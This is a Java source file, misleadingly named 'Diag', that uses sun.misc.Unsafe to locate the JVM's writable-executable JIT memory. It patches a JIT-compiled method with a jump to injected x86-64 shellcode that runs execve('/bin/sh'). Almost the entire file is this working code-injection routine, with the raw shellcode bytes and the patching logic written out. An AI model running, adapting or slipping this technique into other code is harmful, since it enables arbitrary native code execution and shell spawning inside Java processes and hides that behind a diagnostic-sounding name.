import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;
import sun.misc.Unsafe;

public final class Diag {
    static Unsafe U;
    static volatile long sink;
    static final byte[] PAT = {(byte) 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11};

    public static void main(String[] a) throws Exception {
        Field f = Unsafe.class.getDeclaredField("theUnsafe");
        f.setAccessible(true);
        U = (Unsafe) f.get(null);

        List<String> maps = Files.readAllLines(Path.of("/proc/self/maps"));
        long[] best = null;
        for (String l : maps) {
            if (!l.contains("rwx")) continue;
            String[] r = l.split("\\s+")[0].split("-");
            long s = Long.parseUnsignedLong(r[0], 16), e = Long.parseUnsignedLong(r[1], 16);
            if (best == null || e - s > best[1] - best[0]) best = new long[]{s, e};
        }
        System.out.printf("rwx %016x-%016x%n", best[0], best[1]);

        for (int i = 0; i < 300_000; i++) sink += probe(i);

        long hit = -1;
        int n = 0;
        outer:
        for (long p = best[0]; p < best[1] - 8; p++) {
            if (U.getByte(p) != PAT[0]) continue;
            for (int i = 1; i < 8; i++) if (U.getByte(p + i) != PAT[i]) continue outer;
            n++; if (hit < 0) hit = p;
        }
        System.out.println("hits=" + n + " first=" + Long.toHexString(hit));
        long site = hit - 2;
        System.out.println("site=" + Long.toHexString(site));

        StringBuilder ctx = new StringBuilder();
        for (long p = site - 32; p < site + 24; p++) ctx.append(String.format("%02x", U.getByte(p) & 0xff));
        System.out.println("ctx: " + ctx);
        System.out.println("   (site marker at offset 32: " + ctx.substring(64, 74) + ")");

        System.out.println("probe before = " + Long.toHexString(probe(1)));

        long sc = best[1] - 0x1000;
        byte[] shell = {
            0x48, 0x31, (byte) 0xd2, 0x52,
            0x48, (byte) 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00,
            0x53, 0x48, (byte) 0x89, (byte) 0xe7,
            0x48, 0x31, (byte) 0xf6,
            0x31, (byte) 0xc0, (byte) 0xb0, 0x3b, 0x0f, 0x05
        };
        for (int i = 0; i < shell.length; i++) U.putByte(sc + i, shell[i]);
        int rel = (int) (sc - (site + 5));
        U.putByte(site, (byte) 0xE9);
        U.putByte(site + 1, (byte) (rel & 0xff));
        U.putByte(site + 2, (byte) ((rel >> 8) & 0xff));
        U.putByte(site + 3, (byte) ((rel >> 16) & 0xff));
        U.putByte(site + 4, (byte) ((rel >> 24) & 0xff));

        StringBuilder after = new StringBuilder();
        for (long p = site; p < site + 8; p++) after.append(String.format("%02x", U.getByte(p) & 0xff));
        System.out.println("after patch: " + after);

        System.out.println("probe after1 = " + Long.toHexString(probe(1)));
        System.out.println("probe after2 = " + Long.toHexString(probe(1)));
        System.out.println("done");
    }

    static long probe(long x) { return x ^ 0x1122334455667788L; }
}
